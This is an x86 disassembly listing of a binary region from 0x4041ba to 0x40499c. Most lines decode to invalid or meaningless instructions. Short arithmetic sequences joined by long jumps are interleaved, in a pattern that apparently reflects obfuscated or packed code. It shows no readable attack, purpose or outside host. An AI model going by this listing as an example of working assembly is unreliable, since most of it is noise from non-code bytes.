  4041ba:	(bad)  
  4041bb:	cmp    cl,BYTE PTR [ecx-0xde7e6a1]
  4041c1:	and    al,ch
  4041c3:	pop    ecx
  4041c4:	sbb    BYTE PTR [edi+0x30],bl
  4041c7:	adc    al,0xd6
  4041c9:	xor    al,0x74
  4041cb:	fmul   QWORD PTR [eax-0x1acef94d]
  4041d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041d2:	xor    al,0x90
  4041d4:	into   
  4041d5:	mov    ecx,0x6815878c
  4041da:	loope  0x404205
  4041dc:	scas   eax,DWORD PTR es:[edi]
  4041dd:	and    ah,BYTE PTR [edx-0x7cbb41ee]
  4041e3:	ret    
  4041e4:	sub    DWORD PTR [edx-0x16ad5b47],edi
  4041ea:	cmp    eax,0xec666be9
  4041ef:	(bad)  
  4041f0:	cli    
  4041f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041f2:	and    al,0xb1
  4041f4:	push   es
  4041f5:	push   ds
  4041f6:	ins    BYTE PTR es:[edi],dx
  4041f7:	cmp    eax,0xf4f6040b
  4041fc:	mov    eax,ds:0xa84d3cb9
  404201:	ja     0x4041a6
  404203:	fld1   
  404205:	jno    0x40426e
  404207:	(bad)  
  404208:	shl    dl,0x98
  40420b:	mov    edi,0x7bc70c8a
  404210:	mov    edi,0xa54218f6
  404215:	stos   DWORD PTR es:[edi],eax
  404216:	push   0x661c4a33
  40421b:	mov    ecx,0x25a89baf
  404220:	xchg   DWORD PTR [edi],edi
  404222:	xor    eax,ecx
  404224:	add    eax,esi
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0x896ead35
  404243:	(bad)  
  404244:	xor    al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x404253
  40424d:	fs (bad) 
  40424f:	outs   dx,BYTE PTR ds:[esi]
  404250:	jns    0x4042a1
  404252:	into   
  404253:	xchg   esp,eax
  404254:	test   BYTE PTR [ebx-0x35b69fe8],cl
  40425a:	pop    esp
  40425b:	js     0x4042ba
  40425d:	bound  ebp,QWORD PTR [eax+0x7553105e]
  404263:	sahf   
  404264:	pop    esi
  404265:	xchg   esi,eax
  404266:	ins    DWORD PTR es:[edi],dx
  404267:	jmp    0x40425a
  404269:	scas   eax,DWORD PTR es:[edi]
  40426a:	add    eax,DWORD PTR [edx+0x63]
  40426d:	(bad)  
  40426e:	pop    edi
  40426f:	imul   ecx,DWORD PTR [ebx+edi*2],0xef5ec
  404276:	jnp    0x4042a2
  404278:	push   ecx
  404279:	mov    bh,0xe5
  40427b:	test   al,0xd4
  40427d:	inc    edx
  40427e:	mov    dh,0x37
  404280:	fnstsw WORD PTR [edx*8+0x44a3f084]
  404287:	gs mov edi,0xa7c7922d
  40428d:	sbb    al,0x56
  40428f:	jp     0x4042d3
  404291:	fwait
  404292:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404293:	and    BYTE PTR [edi],ah
  404295:	inc    eax
  404296:	or     BYTE PTR [esi-0x5c],ah
  404299:	adc    esp,ebx
  40429b:	jecxz  0x4042bc
  40429d:	jne    0x4042cb
  40429f:	and    BYTE PTR [edx+ebx*4],0xcb
  4042a3:	icebp  
  4042a4:	and    DWORD PTR [eax+0x5e3cf366],edx
  4042aa:	arpl   WORD PTR ds:0xe86cea03,di
  4042b0:	daa    
  4042b1:	jle    0x40424c
  4042b3:	gs push es
  4042b5:	pop    ebp
  4042b6:	mov    eax,ds:0x3a0d3fb5
  4042bb:	xor    al,0xc3
  4042bd:	div    BYTE PTR [edi+edi*8-0x79]
  4042c1:	addr16 loope 0x40427e
  4042c4:	shl    DWORD PTR [ecx],cl
  4042c6:	ss jno 0x40427c
  4042c9:	add    ebp,DWORD PTR [edx-0x24]
  4042cc:	retf   
  4042cd:	jnp    0x4042b9
  4042cf:	icebp  
  4042d0:	(bad)  
  4042d1:	add    ecx,edi
  4042d3:	mov    cl,0xcd
  4042d5:	jno    0x4042bb
  4042d7:	or     al,0x38
  4042d9:	adc    BYTE PTR [esi],ah
  4042db:	test   al,0xe
  4042dd:	jle    0x40428a
  4042df:	retf   
  4042e0:	sub    edi,eax
  4042e2:	push   cs
  4042e3:	and    edi,ecx
  4042e5:	in     eax,0x37
  4042e7:	aaa    
  4042e8:	sbb    edx,edx
  4042ea:	push   0xffffffb8
  4042ec:	jae    0x4042c9
  4042ee:	ss cmc 
  4042f0:	retf   0x2321
  4042f3:	retf   
  4042f4:	fnstcw WORD PTR [edx]
  4042f6:	ret    0xd1a1
  4042f9:	mov    ebx,0x8d01c127
  4042fe:	(bad)  
  4042ff:	in     al,dx
  404300:	jne    0x404371
  404302:	xchg   ecx,eax
  404303:	sbb    cl,BYTE PTR [ebx-0x2e9d7acf]
  404309:	pop    ecx
  40430a:	pusha  
  40430b:	sub    DWORD PTR [esi+0xe],ebx
  40430e:	cmp    esp,DWORD PTR [ecx-0x75a633b5]
  404314:	repnz shl BYTE PTR gs:[edx+0x17],1
  404319:	(bad)  
  40431a:	in     eax,dx
  40431b:	xchg   BYTE PTR [ecx-0x72],bl
  40431e:	sbb    ch,BYTE PTR [edi+eiz*2+0xc67df9a]
  404325:	mov    eax,0x13e5278e
  40432a:	push   cs
  40432b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40432c:	jecxz  0x404392
  40432e:	in     eax,dx
  40432f:	gs (bad) 
  404331:	mov    al,ds:0x9b39c126
  404336:	and    DWORD PTR [edx+0x21],edx
  404339:	xchg   edx,eax
  40433a:	sti    
  40433b:	jb     0x4042ec
  40433d:	sub    esp,DWORD PTR [ecx+ecx*2+0x3514a718]
  404344:	sbb    al,0x8a
  404346:	data16 mov dh,0xbb
  404349:	addr16 loope 0x4043a4
  40434c:	loopne 0x4042f0
  40434e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40434f:	or     al,0x44
  404351:	mov    ds:0x15025bab,eax
  404356:	or     edx,DWORD PTR [ebx]
  404358:	add    ebx,edi
  40435a:	xchg   edx,esi
  40435c:	out    dx,eax
  40435d:	imul   edi,DWORD PTR [eax+0x23cc098c],0x39
  404364:	push   eax
  404365:	retf   
  404366:	scas   al,BYTE PTR es:[edi]
  404367:	enter  0xf204,0xdc
  40436b:	mov    ch,BYTE PTR [eax]
  40436d:	(bad)  [ebx-0x33]
  404370:	sbb    al,0xf2
  404372:	push   eax
  404373:	adc    al,0x89
  404375:	inc    ebp
  404376:	or     BYTE PTR [ebx+0x448a0845],cl
  40437c:	add    eax,0xff558aa8
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rcl    DWORD PTR [ecx-0x236934e5],cl
  4043a6:	daa    
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x40434a
  4043ae:	rcr    BYTE PTR [edi-0x68a9a66f],1
  4043b4:	xlat   BYTE PTR ds:[ebx]
  4043b5:	mov    dh,BYTE PTR [edi+0x5b336a1d]
  4043bb:	or     al,0x51
  4043bd:	jnp    0x404431
  4043bf:	test   al,0x2c
  4043c1:	jae    0x4043a7
  4043c3:	inc    ebp
  4043c4:	rol    dh,0x93
  4043c7:	in     eax,0x75
  4043c9:	mov    edx,0x9b670038
  4043ce:	fsub   st,st(6)
  4043d0:	mov    BYTE PTR [edi+esi*8+0x29],dh
  4043d4:	mov    DWORD PTR [eax-0x786c9927],ebx
  4043da:	mov    eax,0xb07fcdd1
  4043df:	cmp    DWORD PTR [ecx-0x10],0xa3460177
  4043e6:	jae    0x404401
  4043e8:	out    0x4b,eax
  4043ea:	lods   eax,DWORD PTR ds:[esi]
  4043eb:	xchg   BYTE PTR [esi+0x25],al
  4043ee:	rcr    BYTE PTR [edx+0x68],cl
  4043f1:	push   0xb
  4043f3:	and    dh,BYTE PTR [eax+eiz*4]
  4043f6:	pop    esp
  4043f7:	or     ebx,DWORD PTR [edi]
  4043f9:	pop    edx
  4043fa:	outs   dx,DWORD PTR ds:[esi]
  4043fb:	call   0xe8b6ef3b
  404400:	adc    al,0x9a
  404402:	stos   BYTE PTR es:[edi],al
  404403:	test   dl,ch
  404405:	adc    ecx,DWORD PTR [edi+0x9]
  404408:	mov    edx,0x1c5f746c
  40440d:	idiv   BYTE PTR [ebp-0x39]
  404410:	inc    esi
  404411:	aam    0x74
  404413:	sahf   
  404414:	dec    ecx
  404415:	cmp    eax,DWORD PTR [ebx]
  404417:	(bad)  [edi-0x34]
  40441a:	or     eax,0x8c06d520
  40441f:	iret   
  404420:	jmp    0x8ed02e7f
  404425:	(bad)  
  404426:	scas   al,BYTE PTR es:[edi]
  404427:	mov    ebp,0x4eeb626c
  40442c:	pop    ecx
  40442d:	sub    eax,0xee42918f
  404432:	fist   DWORD PTR [edi-0x53164b10]
  404438:	inc    ebx
  404439:	cmp    eax,0x1b50c610
  40443e:	bound  eax,QWORD PTR [ebp+esi*8-0xaf5602e]
  404445:	mov    ah,0xd0
  404447:	leave  
  404448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404449:	mov    dh,0xce
  40444b:	pop    ebp
  40444c:	and    al,0xa7
  40444e:	iret   
  40444f:	xor    ebx,esi
  404451:	das    
  404452:	test   BYTE PTR [esi],dh
  404454:	(bad)  
  404455:	scas   eax,DWORD PTR es:[edi]
  404456:	idiv   DWORD PTR [esi+edx*1]
  404459:	rol    BYTE PTR [esi-0xeccd1b2],cl
  40445f:	jo     0x404458
  404461:	pushf  
  404462:	inc    ecx
  404463:	stos   BYTE PTR es:[edi],al
  404464:	mov    cl,0xb7
  404466:	je     0x40446b
  404468:	aam    0xf4
  40446a:	or     DWORD PTR [ecx+0x55844e07],esp
  404470:	mov    eax,ds:0x7e265670
  404475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404476:	leave  
  404477:	cmp    eax,0x23ac07f3
  40447c:	jne    0x404487
  40447e:	jg     0x4044cb
  404480:	mov    BYTE PTR [edi],cl
  404482:	fwait
  404483:	ss clc 
  404485:	repnz int 0x1c
  404488:	pusha  
  404489:	outs   dx,BYTE PTR ds:[esi]
  40448a:	push   ebp
  40448b:	(bad)  
  40448c:	setns  BYTE PTR [edx-0x62]
  404490:	repz and al,0x6c
  404493:	loopne 0x40445b
  404495:	in     al,0xa
  404497:	dec    esi
  404498:	mov    edx,DWORD PTR ds:0x2191985f
  40449e:	sbb    al,0x2d
  4044a0:	icebp  
  4044a1:	shl    BYTE PTR [edi],0x46
  4044a4:	push   ecx
  4044a5:	dec    edi
  4044a6:	sub    dh,bl
  4044a8:	sub    DWORD PTR [ebp+0x28],eax
  4044ab:	or     BYTE PTR [ebx-0x6e82d5ca],dl
  4044b1:	sub    eax,0x4e5e0ac6
  4044b6:	popa   
  4044b7:	inc    ecx
  4044b8:	mov    dl,0xeb
  4044ba:	mov    bl,0xad
  4044bc:	lea    esi,[ebx-0x77]
  4044bf:	push   ebp
  4044c0:	mov    al,ds:0x166d8564
  4044c5:	cli    
  4044c6:	or     edx,eax
  4044c8:	das    
  4044c9:	aas    
  4044ca:	daa    
  4044cb:	jno    0x4044b3
  4044cd:	mov    ebp,0xb989e777
  4044d2:	(bad)  
  4044d4:	cmp    cl,BYTE PTR [ebx+0x23a0c55]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x40449f
  4044f5:	mov    ds:0x2684675d,eax
  4044fa:	jo     0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x40452f
  404501:	std    
  404502:	mov    edi,0x3512e2c
  404507:	(bad)  [esp+ebx*8]
  40450a:	shl    BYTE PTR [esi],0xbe
  40450d:	mov    al,ds:0x77de3c4
  404512:	ror    bh,cl
  404514:	xor    ecx,DWORD PTR [edx-0x14]
  404517:	subps  xmm3,XMMWORD PTR [ecx]
  40451a:	push   ebp
  40451b:	xchg   BYTE PTR [ecx+ecx*2+0x59062398],al
  404522:	jae    0x4044bf
  404524:	jne    0x404598
  404526:	aam    0x20
  404528:	sbb    ah,0xd8
  40452b:	jnp    0x404531
  40452d:	xor    al,0xfb
  40452f:	addr16 ret 
  404531:	loope  0x4045b0
  404533:	xchg   ecx,eax
  404534:	mov    edx,0xb0209917
  404539:	dec    edi
  40453a:	popf   
  40453b:	stc    
  40453c:	fwait
  40453d:	imul   ebp,DWORD PTR [ecx],0x74cb0d7b
  404543:	pop    eax
  404544:	imul   cl
  404546:	mov    eax,ds:0x8849f03e
  40454b:	in     al,0x56
  40454d:	retf   0x4b94
  404550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404551:	rol    BYTE PTR [edx],cl
  404553:	adc    al,0x31
  404555:	mov    ch,0x48
  404557:	inc    edx
  404558:	ja     0x40458e
  40455a:	std    
  40455b:	inc    eax
  40455c:	shl    DWORD PTR [eax],1
  40455e:	jmp    0x2f2e4515
  404563:	sub    ebp,DWORD PTR [esi]
  404565:	test   BYTE PTR [ebx+0x2563a4ff],al
  40456b:	inc    edi
  40456c:	in     al,dx
  40456d:	fbstp  TBYTE PTR [edi]
  40456f:	fldcw  WORD PTR [edi]
  404571:	adc    DWORD PTR [ebx+edx*8-0x8],ebp
  404575:	push   es
  404576:	adc    DWORD PTR [ecx-0x58],ebp
  404579:	xchg   edi,eax
  40457a:	xchg   edi,eax
  40457b:	push   es
  40457c:	jb     0x4045a6
  40457e:	mov    dl,0x3c
  404580:	jnp    0x4045da
  404582:	add    eax,0x5d3f2432
  404587:	mov    edi,0x1cdc9c21
  40458c:	in     al,0x76
  40458e:	gs lahf 
  404590:	bound  esp,QWORD PTR [ebx-0x3d161b60]
  404596:	jl     0x4045cf
  404598:	(bad)  
  404599:	cs mov bh,0x2f
  40459c:	stos   BYTE PTR es:[edi],al
  40459d:	pop    ebx
  40459e:	sti    
  40459f:	cld    
  4045a0:	mov    dl,0x88
  4045a2:	mov    BYTE PTR [eax+ecx*8],0x4a
  4045a6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4045a8:	lds    ecx,FWORD PTR [edx]
  4045aa:	push   edi
  4045ab:	ror    DWORD PTR [ebx+ebp*8],cl
  4045ae:	pop    eax
  4045af:	lods   al,BYTE PTR ds:[esi]
  4045b0:	imul   edx,DWORD PTR [edi+0xd4f531f],0x4fb99f3c
  4045ba:	and    edx,DWORD PTR [ebx-0x21a13832]
  4045c0:	xor    DWORD PTR [ecx-0x71],ebp
  4045c3:	out    0x7c,al
  4045c5:	push   ebx
  4045c6:	pop    ds
  4045c7:	test   BYTE PTR [ecx],bh
  4045c9:	and    BYTE PTR [esi+0x40ea2f7e],cl
  4045cf:	xchg   BYTE PTR [edi],dl
  4045d1:	(bad)  
  4045d2:	pop    ds
  4045d3:	jl     0x4045d6
  4045d5:	call   0x24c15147
  4045da:	and    al,0xcc
  4045dc:	or     BYTE PTR [ecx],0x60
  4045df:	push   es
  4045e0:	(bad)  
  4045e2:	jp     0x4045bb
  4045e4:	leave  
  4045e5:	xchg   ebp,eax
  4045e6:	test   ecx,esp
  4045e8:	fchs   
  4045ea:	call   0xbf18:0xd515ec75
  4045f1:	jb     0x40458f
  4045f3:	scas   eax,DWORD PTR es:[edi]
  4045f4:	iret   
  4045f5:	scas   al,BYTE PTR es:[edi]
  4045f6:	fdivr  QWORD PTR [edx-0x15c3fa79]
  4045fc:	ins    BYTE PTR es:[edi],dx
  4045fd:	clc    
  4045fe:	rcr    DWORD PTR [eax+ebx*4-0x3c],1
  404602:	xor    ah,dh
  404604:	and    dh,BYTE PTR ds:0xc1a6253f
  40460a:	cli    
  40460b:	jmp    0x3947514d
  404610:	das    
  404611:	pop    edi
  404612:	and    eax,0xd94836f6
  404617:	push   eax
  404618:	xchg   esp,eax
  404619:	push   esi
  40461a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40461b:	xchg   edx,eax
  40461c:	das    
  40461d:	sti    
  40461e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40461f:	push   esi
  404620:	mov    ebp,0x14f25f18
  404625:	mov    ebp,DWORD PTR [eax+0xc558be8]
  40462b:	movsx  edx,BYTE PTR [edx]
  40462e:	xor    eax,ecx
  404630:	add    eax,esi
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xfa476c86
  404647:	and    ecx,DWORD PTR [esi-0x54]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	jns    0x404666
  404653:	or     BYTE PTR [eax-0x6],al
  404656:	in     al,dx
  404657:	fstp   DWORD PTR [ebx-0x1873cf78]
  40465d:	or     ah,cl
  40465f:	ds (bad) 
  404661:	out    0xd4,al
  404663:	cdq    
  404664:	sar    bh,cl
  404666:	not    DWORD PTR [edi+eiz*8+0xe23fc97]
  40466d:	push   cs
  40466e:	jbe    0x40469b
  404670:	jp     0x404608
  404672:	mov    edx,DWORD PTR [eax+0x14]
  404675:	sbb    al,0x6c
  404677:	int    0x33
  404679:	adc    eax,0x73f3acb0
  40467e:	out    0xbc,eax
  404680:	dec    ebp
  404681:	sahf   
  404682:	retf   
  404683:	and    BYTE PTR [esi+0x60],cl
  404686:	mov    al,ds:0x964ff056
  40468b:	aad    0x8e
  40468d:	sbb    DWORD PTR [ecx+0x31],eax
  404690:	xor    al,0x4c
  404692:	mov    dh,0x2a
  404694:	add    ah,BYTE PTR [esi-0x3b834adc]
  40469a:	es jns 0x404699
  40469d:	shl    cl,1
  40469f:	jmp    0x1ff4b306
  4046a4:	cmp    dh,BYTE PTR ds:0xd0220dd2
  4046aa:	call   0xf9f5d712
  4046af:	cmc    
  4046b0:	in     eax,dx
  4046b1:	mov    edi,DWORD PTR [eax]
  4046b3:	call   0x661d5d49
  4046b8:	push   ds
  4046b9:	jecxz  0x404656
  4046bb:	scas   eax,DWORD PTR es:[edi]
  4046bc:	push   0x3ea01a8d
  4046c1:	sbb    eax,0xb652efcf
  4046c6:	pusha  
  4046c7:	sub    bh,bl
  4046c9:	lods   al,BYTE PTR ds:[esi]
  4046ca:	fadd   st(6),st
  4046cc:	xchg   esi,eax
  4046cd:	push   ss
  4046ce:	adc    ebx,DWORD PTR [eax]
  4046d0:	and    al,0x11
  4046d2:	aas    
  4046d3:	call   DWORD PTR [eax+0x5b]
  4046d6:	out    0x50,al
  4046d8:	or     BYTE PTR [ecx+0x70],al
  4046db:	jne    0x40467f
  4046dd:	cdq    
  4046de:	popa   
  4046df:	jnp    0x40470a
  4046e1:	and    al,0x81
  4046e3:	leave  
  4046e4:	xchg   ebp,eax
  4046e5:	jmp    0x56bd:0xddefd52d
  4046ec:	mov    DWORD PTR [eax+eiz*2-0x47],0x825885db
  4046f4:	fisubr WORD PTR [ecx+0x56]
  4046f7:	rcr    BYTE PTR [edi-0x30],0xab
  4046fb:	or     bh,dl
  4046fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046fe:	sbb    eax,0x315efe9c
  404703:	or     dh,BYTE PTR [ebp+ebp*1-0x45]
  404707:	clc    
  404708:	lods   eax,DWORD PTR ds:[esi]
  404709:	test   eax,0x238ebe86
  40470e:	adc    BYTE PTR [ebx],ah
  404710:	lods   eax,DWORD PTR ds:[esi]
  404711:	add    BYTE PTR [edi+eax*4+0x6d],cl
  404715:	push   ebp
  404716:	jmp    0x40476a
  404718:	or     eax,0xf26f8965
  40471d:	mov    DWORD PTR [eax+eiz*8],edx
  404720:	inc    esi
  404721:	jmp    0x40473d
  404723:	(bad)  
  404725:	cld    
  404726:	cld    
  404727:	les    ecx,FWORD PTR [eax+0x1095ac02]
  40472d:	(bad)  
  40472e:	loop   0x4046ff
  404730:	or     eax,0x1bf0f834
  404735:	adc    eax,0x7bbf62d
  40473a:	(bad)  
  40473b:	out    0x6f,al
  40473d:	push   ebx
  40473e:	and    BYTE PTR [ebp+0x52],0x39
  404742:	test   al,0x41
  404744:	or     BYTE PTR [esi-0x2],ch
  404747:	jbe    0x4046dc
  404749:	ret    0x1d46
  40474c:	pop    eax
  40474d:	push   eax
  40474e:	jno    0x404715
  404750:	sbb    al,0xf5
  404752:	mov    ch,0x2b
  404754:	mov    dh,0xcb
  404756:	fistp  DWORD PTR ds:0x20d24752
  40475c:	inc    esp
  40475d:	retf   0x9718
  404760:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404761:	jecxz  0x404764
  404763:	mov    esi,0x7f0055bd
  404768:	push   cs
  404769:	das    
  40476a:	adc    eax,0x6c2ec292
  40476f:	cmp    eax,ecx
  404771:	xchg   BYTE PTR [ebp-0x2c],bl
  404774:	lods   al,BYTE PTR ds:[esi]
  404775:	cmp    DWORD PTR ds:0x840f6e6d,edi
  40477b:	inc    DWORD PTR [ebx]
  40477d:	add    BYTE PTR [eax],al
  40477f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	ja     0x40474c
  404799:	es aaa 
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x404786
  4047a4:	pop    ebx
  4047a5:	sub    BYTE PTR [ecx],ch
  4047a7:	mov    al,0xf3
  4047a9:	adc    al,0x63
  4047ab:	out    0xa9,eax
  4047ad:	scas   al,BYTE PTR es:[edi]
  4047ae:	das    
  4047af:	and    DWORD PTR [eax],eax
  4047b1:	push   cs
  4047b2:	call   0x9e10:0x38ab004f
  4047b9:	fdivrp st(0),st
  4047bb:	inc    edi
  4047bc:	lods   al,BYTE PTR ds:[esi]
  4047bd:	scas   eax,DWORD PTR es:[edi]
  4047be:	xor    ah,bh
  4047c0:	cld    
  4047c1:	fwait
  4047c2:	add    al,BYTE PTR [edi]
  4047c4:	fidiv  DWORD PTR [edi+0x73]
  4047c7:	loope  0x404802
  4047c9:	add    DWORD PTR [edx-0x2],esi
  4047cc:	fidivr WORD PTR [ebp-0x57]
  4047cf:	bound  eax,QWORD PTR [edx-0x3ea31d26]
  4047d5:	push   esi
  4047d6:	and    BYTE PTR [ebx],0x6d
  4047d9:	push   es
  4047da:	jecxz  0x4047f4
  4047dc:	push   es
  4047dd:	xchg   esp,eax
  4047de:	and    DWORD PTR [ebp+0x52],ecx
  4047e1:	mov    DWORD PTR [edx+0x65],eax
  4047e4:	call   0x2055d2a4
  4047e9:	lock jns 0x40480d
  4047ec:	(bad)  
  4047ed:	and    al,0xcc
  4047ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047f0:	xor    DWORD PTR [edi-0xd621ac5],0x2
  4047f7:	and    BYTE PTR [edx],al
  4047f9:	adc    al,0x88
  4047fb:	mov    WORD PTR [ebx+ebp*1],ss
  4047fe:	into   
  4047ff:	(bad)  
  404800:	repnz mov ebp,0x94e0a1ce
  404806:	out    dx,eax
  404807:	xchg   ch,ch
  404809:	cli    
  40480a:	retf   0x5e38
  40480d:	sub    BYTE PTR [edx+0x27],ch
  404810:	out    0x77,al
  404812:	dec    esp
  404813:	mov    esi,0x77c293d0
  404818:	out    dx,eax
  404819:	out    0xa8,eax
  40481b:	fcmove st,st(7)
  40481d:	mov    eax,0x56360006
  404822:	stos   DWORD PTR es:[edi],eax
  404823:	adc    al,0xd9
  404825:	jbe    0x404836
  404827:	test   DWORD PTR [edx],0x9fe08aaf
  40482d:	into   
  40482e:	aam    0x8e
  404830:	sub    bl,BYTE PTR ds:0x92d3fc5d
  404836:	adc    BYTE PTR [esi],bl
  404838:	repz add al,BYTE PTR [eax+0x40]
  40483c:	adc    al,ah
  40483e:	xor    BYTE PTR [ecx-0x682c72a1],al
  404844:	fucomi st,st(4)
  404846:	hlt    
  404847:	mov    ecx,0x59d00928
  40484c:	retf   
  40484d:	and    dh,BYTE PTR ds:0xbfd6c815
  404853:	mov    ch,0xff
  404855:	inc    ecx
  404856:	mov    ah,0x4c
  404858:	mov    al,ds:0x6e995b0d
  40485d:	and    al,ah
  40485f:	clc    
  404860:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404861:	dec    ebx
  404862:	sbb    dl,dh
  404864:	ins    BYTE PTR es:[edi],dx
  404865:	mov    edi,0xba5a0d6d
  40486a:	xchg   ebx,eax
  40486b:	fs stc 
  40486d:	(bad)  
  40486e:	jmp    0x4047f0
  404870:	jb     0x404810
  404872:	jecxz  0x4048a3
  404874:	cmp    eax,0xb5396811
  404879:	push   edx
  40487a:	or     ah,dh
  40487c:	(bad)  
  40487d:	iret   
  40487e:	sbb    ah,ah
  404880:	xchg   BYTE PTR [eax],ch
  404882:	cmp    BYTE PTR [ebp-0x1b],al
  404885:	add    al,0xee
  404887:	add    al,0xe0
  404889:	inc    ecx
  40488a:	mov    ch,BYTE PTR [ebp-0x67]
  40488d:	int3   
  40488e:	lds    edx,FWORD PTR [ecx]
  404890:	lods   eax,DWORD PTR ds:[esi]
  404891:	scas   eax,DWORD PTR es:[edi]
  404892:	adc    al,0xc7
  404894:	not    DWORD PTR [ecx]
  404896:	data16 add BYTE PTR [ecx+0x76],ch
  40489a:	in     eax,dx
  40489b:	jb     0x404848
  40489d:	pop    ebp
  40489e:	xor    ecx,ecx
  4048a0:	(bad)  [esi-0x5b]
  4048a3:	push   0x2e
  4048a5:	inc    esi
  4048a6:	add    DWORD PTR [esi+0x6021992],edi
  4048ac:	add    eax,0x5eeb317
  4048b1:	adc    BYTE PTR [esp+edi*1+0x6e],dh
  4048b5:	popa   
  4048b6:	popf   
  4048b7:	fnstenv [edi+0x59be55ef]
  4048bd:	pop    edi
  4048be:	pop    ss
  4048bf:	pop    edi
  4048c0:	xchg   ebx,eax
  4048c1:	or     dh,BYTE PTR ds:0xf3ce9fc0
  4048c7:	jmp    0x40493a
  4048c9:	pop    edi
  4048ca:	mov    dl,0x8d
  4048cc:	inc    ebp
  4048cd:	call   0x8c2c8e5b
  4048d2:	inc    ebp
  4048d3:	in     al,dx
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0x4004a575
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x40488f
  40490a:	xchg   esp,eax
  40490b:	mov    bl,BYTE PTR [esi+0x3de8dc36]
  404911:	dec    edx
  404912:	push   eax
  404913:	test   BYTE PTR [ecx-0x1e],cl
  404916:	xor    eax,0xa9ce6723
  40491b:	xchg   DWORD PTR [ecx+esi*1-0x11],eax
  40491f:	mov    al,0xe3
  404921:	int    0x32
  404923:	xchg   ebx,eax
  404924:	jle    0x404977
  404926:	xor    eax,0xa230c6e7
  40492b:	push   edi
  40492c:	popf   
  40492d:	sbb    eax,0x76de37ca
  404932:	xor    DWORD PTR [ebp-0x3c],esp
  404935:	dec    edi
  404936:	add    BYTE PTR [edx],dh
  404938:	jb     0x404992
  40493a:	stc    
  40493b:	mov    eax,0x781549fa
  404940:	lea    esp,[eax+0x32]
  404943:	and    ah,ah
  404945:	sub    edi,DWORD PTR [edx+0x7d]
  404948:	push   eax
  404949:	xchg   ebp,eax
  40494a:	sbb    BYTE PTR ds:0xac4f3536,0x63
  404951:	cdq    
  404952:	inc    esi
  404953:	dec    esp
  404954:	push   edx
  404955:	jl     0x4049a9
  404957:	(bad)  
  404958:	jne    0x404935
  40495a:	cmp    eax,0x463be3ae
  40495f:	mov    esi,ecx
  404961:	lods   eax,DWORD PTR ds:[esi]
  404962:	loope  0x4049c1
  404964:	xchg   ecx,eax
  404965:	sbb    al,0xf7
  404967:	or     DWORD PTR [ebp-0xe],ebp
  40496a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40496b:	ds frstor ss:[edx-0x78]
  404970:	pop    edx
  404971:	sbb    eax,0x6b4dc944
  404976:	fidivr DWORD PTR [ebx+0x99b79f8]
  40497c:	or     DWORD PTR [esi],eax
  40497e:	xchg   ebx,eax
  40497f:	xor    DWORD PTR ds:0x7a1a7592,ebp
  404985:	adc    edi,DWORD PTR [esi+edx*2]
  404988:	xor    al,0xa3
  40498a:	cmc    
  40498b:	sub    edi,ebx
  40498d:	std    
  40498e:	mov    ebp,esi
  404990:	or     ch,bl
  404992:	fsub   QWORD PTR [ebp-0x610982ef]
  404998:	and    DWORD PTR [edi-0x48],eax
  40499b:	xchg   edi,eax
  40499c:	data16 daa 
